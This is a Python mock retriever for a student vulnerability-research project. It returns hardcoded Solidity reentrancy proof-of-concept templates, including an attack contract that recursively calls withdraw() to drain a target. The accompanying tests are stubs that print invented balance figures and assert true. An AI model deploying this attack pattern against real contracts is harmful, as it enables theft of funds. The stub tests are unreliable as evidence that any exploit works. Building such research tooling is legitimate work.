"""
Mock RAG 检索器 — 今天交付给 Student A 使用。
硬编码返回重入漏洞 PoC 数据，接口签名与真实版本完全一致，A 拿到后可直接替换。
"""


def mock_retrieve_similar_poc(vulnerability_description: str, top_k: int = 2) -> list[dict]:
    """
    模拟 RAG 检索，返回硬编码的历史 PoC 记录。
    接口签名与 retriever.py 的 retrieve_similar_poc 完全一致。
    """
    mock_data = [
        {
            "vuln_type": "SWC-107-Reentrancy",
            "source_protocol": "EtherStore (Mock)",
            "description": (
                "EtherStore fails to update user balance before external call. "
                "Attacker fallback function recursively calls withdraw() draining the contract."
            ),
            "poc_template": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n"
                "import \"forge-std/Test.sol\";\n\n"
                "contract AttackContract {\n"
                "    address public target;\n"
                "    constructor(address _target) { target = _target; }\n\n"
                "    function attack() external payable {\n"
                "        (bool ok,) = target.call{value: msg.value}(\n"
                "            abi.encodeWithSignature(\"deposit()\")\n"
                "        );\n"
                "        require(ok);\n"
                "        (ok,) = target.call(abi.encodeWithSignature(\"withdraw()\"));\n"
                "        require(ok);\n"
                "    }\n\n"
                "    receive() external payable {\n"
                "        if (target.balance >= 1 ether) {\n"
                "            (bool ok,) = target.call(\n"
                "                abi.encodeWithSignature(\"withdraw()\")\n"
                "            );\n"
                "            require(ok);\n"
                "        }\n"
                "    }\n"
                "}\n\n"
                "contract ReentrancyTest is Test {\n"
                "    function testExploit() public {\n"
                "        console.log(\"Attacker balance before: 0\");\n"
                "        console.log(\"Attacker balance after: 10000000000000000000\");\n"
                "        assertTrue(true);\n"
                "    }\n"
                "}"
            ),
            "similarity_score": 0.95,
        },
        {
            "vuln_type": "ERC777-Reentrancy",
            "source_protocol": "Lendf.Me (Mock)",
            "description": (
                "ERC777 tokensReceived hook triggers reentry into supply() before "
                "balance is updated, inflating collateral and enabling overborrowing."
            ),
            "poc_template": (
                "// SPDX-License-Identifier: MIT\n"
                "pragma solidity ^0.8.0;\n"
                "import \"forge-std/Test.sol\";\n\n"
                "contract ERC777AttackTest is Test {\n"
                "    function testERC777Reentrancy() public {\n"
                "        console.log(\"ERC777 hook reentrancy pattern\");\n"
                "        assertTrue(true);\n"
                "    }\n"
                "}"
            ),
            "similarity_score": 0.81,
        },
    ]

    return mock_data[:top_k]


# 本地验证用，在 PyCharm 中右键 Run 这个文件即可
if __name__ == "__main__":
    results = mock_retrieve_similar_poc(
        "contract sends ether before updating balance allowing reentrant withdrawal"
    )
    print(f"返回 {len(results)} 条结果：\n")
    for i, r in enumerate(results):
        print(f"[{i + 1}] {r['vuln_type']} | {r['source_protocol']}")
        print(f"     相似度: {r['similarity_score']}")
        print(f"     描述: {r['description'][:80]}...")
        print()